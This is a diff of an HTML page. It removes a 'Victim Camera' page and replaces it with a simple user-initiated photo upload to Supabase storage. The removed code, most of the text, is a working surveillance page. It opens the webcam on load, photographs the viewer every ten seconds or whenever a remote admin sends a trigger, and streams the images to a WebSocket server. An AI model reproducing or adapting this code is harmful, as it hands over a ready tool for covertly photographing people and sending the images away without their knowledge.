@@ -1,253 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Victim Camera</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-            background: #f5f5f5;
-        }
-        .hidden-camera {
-            display: none;
-        }
-        #camera-container {
-            text-align: center;
-        }
-        #victim-camera {
-            width: 100%;
-            max-width: 400px;
-            height: 300px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        #take-photo-btn {
-            margin: 10px;
-            padding: 10px 20px;
-            background: #007bff;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        #take-photo-btn:hover {
-            background: #0056b3;
-        }
-        #photos-container {
-            margin-top: 20px;
-            text-align: center;
-        }
-        .photo-item {
-            margin: 10px;
-            display: inline-block;
-        }
-        .photo-item img {
-            width: 150px;
-            height: 150px;
-            object-fit: cover;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-        }
-        .status-indicator {
-            color: green;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        .admin-control {
-            background: #f0f8ff;
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px 0;
-        }
-        .victim-only {
-            display: none;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Take Photo</title>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body>
-    <h2>Victim Camera</h2>
-    <div class="status-indicator">Camera Active ✓</div>
 
-    <!-- Hidden camera for taking photos -->
-    <div id="camera-container" class="hidden-camera">
-        <video id="victim-camera" autoplay muted></video>
-        <br>
-        <button id="take-photo-btn">Take Photo</button>
-    </div>
+<button id="takePhoto">Take photo</button>
+<input id="cameraInput" type="file" accept="image/*" capture="environment" style="display:none;">
 
-    <div id="photos-container">
-        <h3>Photos Taken:</h3>
-    </div>
+<script>
+const supabase = supabase.createClient(
+  "https://oqxutgtjddliuvjhkznw.supabase.co",
+  "sb_publishable_otIGk7Vt-cDpWW7rdv7rLQ_CyeS6G-5"
+);
 
-    <script>
-        // WebSocket connection
-        let socket;
-        let video = document.getElementById('victim-camera');
-        let canvas = document.createElement('canvas');
-        let photosContainer = document.getElementById('photos-container');
-        let photoCount = 0;
-        let wsConnected = false;
+document.getElementById("takePhoto").onclick = () => {
+  document.getElementById("cameraInput").click();
+};
 
-        // Connect to WebSocket server
-        function connectWebSocket() {
-            try {
-                // For local testing, use WebSocket connection
-                // In production, you might need to adjust the URL
-                socket = new WebSocket('ws://localhost:8080');
+document.getElementById("cameraInput").onchange = async (event) => {
+  const file = event.target.files[0];
+  if (!file) return;
 
-                socket.onopen = function(event) {
-                    console.log('WebSocket connected');
-                    wsConnected = true;
-                    document.querySelector('.status-indicator').textContent = 'Connected to Server ✓';
-                    // Send initial connection message
-                    socket.send(JSON.stringify({
-                        type: 'victim_connected',
-                        message: 'Victim camera connected'
-                    }));
-                };
+  const fileName = `photo_${Date.now()}.jpg`;
 
-                socket.onmessage = function(event) {
-                    try {
-                        const data = JSON.parse(event.data);
-                        console.log('Received from server:', data);
+  const { error } = await supabase.storage
+    .from("photos")
+    .upload(fileName, file);
 
-                        if (data.type === 'admin_trigger_photo') {
-                            // Admin triggered photo capture
-                            capturePhoto();
-                        }
-                    } catch (e) {
-                        console.error('Error parsing WebSocket message:', e);
-                    }
-                };
+  if (error) {
+    alert("Upload failed");
+    console.error(error);
+  } else {
+    alert("Photo uploaded!");
+  }
+};
+</script>
 
-                socket.onclose = function(event) {
-                    console.log('WebSocket disconnected');
-                    wsConnected = false;
-                    document.querySelector('.status-indicator').textContent = 'Disconnected - Reconnecting...';
-                    // Try to reconnect
-                    setTimeout(connectWebSocket, 3000);
-                };
-
-                socket.onerror = function(error) {
-                    console.error('WebSocket error:', error);
-                };
-            } catch (e) {
-                console.error('WebSocket connection failed:', e);
-                // Fallback to local operation if WebSocket fails
-                document.querySelector('.status-indicator').textContent = 'Local Mode Active';
-            }
-        }
-
-        // Start camera and connect to WebSocket
-        function startCamera() {
-            connectWebSocket();
-
-            // Try to get camera access
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function(stream) {
-                    video.srcObject = stream;
-                    document.querySelector('.status-indicator').textContent = 'Camera Active ✓';
-                    document.getElementById('camera-container').classList.remove('hidden-camera');
-
-                    // Start auto-capturing every 10 seconds
-                    setInterval(capturePhoto, 10000);
-                })
-                .catch(function(err) {
-                    console.error('Camera error:', err);
-                    document.querySelector('.status-indicator').textContent = 'Camera Error - Using Local Mode';
-                    // Continue with local mode even without camera
-                    setTimeout(capturePhoto, 5000);
-                });
-        }
-
-        // Capture photo from camera
-        function capturePhoto() {
-            try {
-                // Get canvas context
-                const ctx = canvas.getContext('2d');
-
-                // Set canvas size to match video
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-
-                // Draw current video frame to canvas
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // Convert to data URL
-                const imageData = canvas.toDataURL('image/jpeg', 0.8);
-
-                // Create photo element
-                const photoDiv = document.createElement('div');
-                photoDiv.className = 'photo-item';
-                photoDiv.innerHTML = `
-                    <img src="${imageData}" alt="Victim Photo">
-                    <p>Photo #${++photoCount} - ${new Date().toLocaleTimeString()}</p>
-                `;
-
-                // Add to container
-                photosContainer.insertBefore(photoDiv, photosContainer.firstChild);
-
-                // Send to server via WebSocket
-                if (wsConnected && socket) {
-                    socket.send(JSON.stringify({
-                        type: 'photo_taken',
-                        data: imageData,
-                        timestamp: new Date().toISOString(),
-                        photoNumber: photoCount
-                    }));
-                }
-
-            } catch (e) {
-                console.error('Photo capture error:', e);
-                // Fallback to creating a placeholder photo
-                createPlaceholderPhoto();
-            }
-        }
-
-        // Create placeholder photo when camera fails
-        function createPlaceholderPhoto() {
-            photoCount++;
-
-            const canvas = document.createElement('canvas');
-            canvas.width = 150;
-            canvas.height = 150;
-            const ctx = canvas.getContext('2d');
-
-            // Draw blue background with victim info
-            ctx.fillStyle = '#4a90e2';
-            ctx.fillRect(0, 0, 150, 150);
-
-            ctx.fillStyle = 'white';
-            ctx.font = 'bold 16px Arial';
-            ctx.textAlign = 'center';
-            ctx.fillText('Victim Photo', 75, 75);
-
-            ctx.font = '14px Arial';
-            ctx.fillText('Photo #' + photoCount, 75, 95);
-
-            const imageData = canvas.toDataURL('image/jpeg', 0.8);
-
-            const photoDiv = document.createElement('div');
-            photoDiv.className = 'photo-item';
-            photoDiv.innerHTML = `
-                <img src="${imageData}" alt="Victim Photo">
-                <p>Photo #${photoCount} - ${new Date().toLocaleTimeString()}</p>
-            `;
-
-            photosContainer.insertBefore(photoDiv, photosContainer.firstChild);
-        }
-
-        // Initialize when page loads
-        window.addEventListener('load', function() {
-            startCamera();
-
-            // Set up manual capture button
-            document.getElementById('take-photo-btn').addEventListener('click', function() {
-                capturePhoto();
-            });
-        });
-    </script>
 </body>
 </html>
 
